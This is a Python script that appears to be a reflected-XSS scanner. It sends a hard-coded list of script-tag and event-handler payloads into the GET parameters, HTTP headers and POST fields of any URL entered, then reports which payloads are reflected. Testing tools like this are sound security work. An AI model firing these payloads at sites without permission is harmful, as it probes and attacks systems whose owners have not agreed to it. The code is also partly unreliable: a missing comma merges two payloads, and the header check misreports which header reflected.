import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm
import re

advanced_payload = [
    "<iframe src=\"javascript:alert(`xss`)\">",
    "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>"
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SvG/oNlOaD=alert(1)>",
    "<ImG sRc=x oNeRrOr=alert(1)>",
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "\" onmouseover=alert(1) \"",
    "' onfocus=alert(1) '",
    "<svg/onload=alert`1`>",
    "<script>alert`1`</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<svg/onload=confirm(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Csvg/onload=alert(1)%3E",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<div onmouseenter=alert(1)>",
    "<div onpointerover=alert(1)>",
    "<!--<script>alert(1)</script>-->",
    "<script>/*alert(1)*/</script>",
    "<svg/onload = alert(1)>",
    "<script> alert(1) </script>",
    "><script>alert(1)//",
    "\"><script>alert(1)//",
    "'><script>alert(1)//",
]

test_headers = [
    "X-Forwarded-For",
    "X-Real-IP",
    "User-Agent",
    "Referer",
    "Origin"
]


def xss_inject(url, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    if not qs:
        qs = {"q": [payload]}
    else:
        for key in qs.keys():
            qs[key] = [payload]

    new_query = urlencode(qs, doseq=True)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", new_query, ""))
    return new_url


def detect_context(response_text, payload):
    contexts = []

    if re.search(r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>', response_text, re.IGNORECASE):
        contexts.append("Inside <script> tag")
    if re.search(r'<[^>]*?(?:on\w+)\s*=\s*["\']?[^"\'>]*' + re.escape(payload), response_text, re.IGNORECASE):
        contexts.append("Inside event handler")
    if re.search(r'<[^>]*?href\s*=\s*["\']?[^"\'>]*' + re.escape(payload), response_text, re.IGNORECASE):
        contexts.append("Inside href attribute")
    if re.search(r'<[^>]*?src\s*=\s*["\']?[^"\'>]*' + re.escape(payload), response_text, re.IGNORECASE):
        contexts.append("Inside src attribute")
    if re.search(r'<[^>]*?value\s*=\s*["\']?[^"\'>]*' + re.escape(payload), response_text, re.IGNORECASE):
        contexts.append("Inside value attribute")
    if re.search(r'<[^>]*?style\s*=\s*["\']?[^"\'>]*' + re.escape(payload), response_text, re.IGNORECASE):
        contexts.append("Inside style attribute")

    return contexts if contexts else ["Unknown/Generic context"]


def scan_headers(url, payload, headers):
    try:
        custom_headers = headers.copy()
        for test_header in test_headers:
            custom_headers[test_header] = payload

        response = requests.get(url, headers=custom_headers, timeout=7)
        response.encoding = response.apparent_encoding

        if payload in response.text:
            return True, test_header
    except:
        pass
    return False, None


def scan_post(url, payload):
    test_data = {
        "q": payload,
        "search": payload,
        "input": payload,
        "name": payload,
        "comment": payload,
        "message": payload
    }

    try:
        response = requests.post(url, data=test_data, timeout=7)
        response.encoding = response.apparent_encoding

        if payload in response.text:
            return True, test_data
    except:
        pass
    return False, None


def scan_xss(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner Advanced)"
    }

    vulnerable = []

    print(f"\n🎯 Starting XSS scan on: {url}")
    print("=" * 70)
    print("⚡ Testing methods: GET parameters, Headers, POST data")
    print(f"?? Payloads to test: {len(advanced_payload)}")
    print("="*70)

    print("\n📡 Phase 1: Testing GET parameters...")
    for payload in tqdm(advanced_payload, desc="🔍 GET scanning", unit="payload", ncols=100):
        url_test = xss_inject(url, payload)

        try:
            response = requests.get(url_test, headers=headers, timeout=7)
            response.encoding = response.apparent_encoding

            if payload in response.text:
                contexts = detect_context(response.text, payload)
                tqdm.write(f"\n✅ [VULNERABLE - GET] Reflected XSS found!")
                tqdm.write(f"   📍 URL: {url_test}")
                tqdm.write(f"   💉 Payload: {payload}")
                tqdm.write(f"   🎯 Context: {', '.join(contexts)}\n")
                vulnerable.append(("GET", url_test, payload, contexts))
            else:
                tqdm.write(f"❌ GET - Not vulnerable: {payload[:40]}...")

        except requests.exceptions.RequestException:
            tqdm.write(f"⚠️  Request failed: {payload[:30]}...")
            continue

    print("\n📡 Phase 2: Testing HTTP Headers (Blind XSS)...")
    for payload in tqdm(advanced_payload[:10], desc="🔍 Header scanning", unit="payload", ncols=100):
        is_vuln, header_name = scan_headers(url, payload, headers)

        if is_vuln:
            tqdm.write(f"\n✅ [VULNERABLE - HEADER] Blind XSS found!")
            tqdm.write(f"   📍 URL: {url}")
            tqdm.write(f"   💉 Payload: {payload}")
            tqdm.write(f"   🎯 Header: {header_name}\n")
            vulnerable.append(("HEADER", url, payload, [f"Header: {header_name}"]))
        else:
            tqdm.write(f"❌ HEADER - Not vulnerable: {payload[:40]}...")

    print("\n📡 Phase 3: Testing POST parameters...")
    for payload in tqdm(advanced_payload[:10], desc="🔍 POST scanning", unit="payload", ncols=100):
        is_vuln, post_data = scan_post(url, payload)

        if is_vuln:
            tqdm.write(f"\n✅ [VULNERABLE - POST] XSS found!")
            tqdm.write(f"   📍 URL: {url}")
            tqdm.write(f"   💉 Payload: {payload}")
            tqdm.write(f"   📦 POST data: {post_data}\n")
            vulnerable.append(("POST", url, payload, [f"POST data: {post_data}"]))
        else:
            tqdm.write(f"❌ POST - Not vulnerable: {payload[:40]}...")

    print("\n" + "="*70)
    if vulnerable:
        print(f"🎉 Scan completed! Found {len(vulnerable)} vulnerability(s):")
        print("="*70)
        for idx, (method, vuln_url, vuln_payload, contexts) in enumerate(vulnerable, 1):
            print(f"\n{idx}. 🔴 Method: {method}")
            print(f"   URL: {vuln_url}")
            print(f"   Payload: {vuln_payload}")
            print(f"   Details: {', '.join(contexts)}")
    else:
        print("🔒 No XSS vulnerabilities found in tested vectors.")
        print("\n💡 Note: This scan only covers reflected XSS in:")
        print("   - GET parameters (full payload list)")
        print("   - HTTP Headers (first 10 payloads)")
        print("   - POST data (first 10 payloads)")
    print("="*70)

    return vulnerable

if __name__ == "__main__":
    url_input = input("🌐 Enter URL (including http:// or https://): ")
    if not url_input.startswith(("http://", "https://")):
        url_input = "http://" + url_input

    scan_xss(url_input)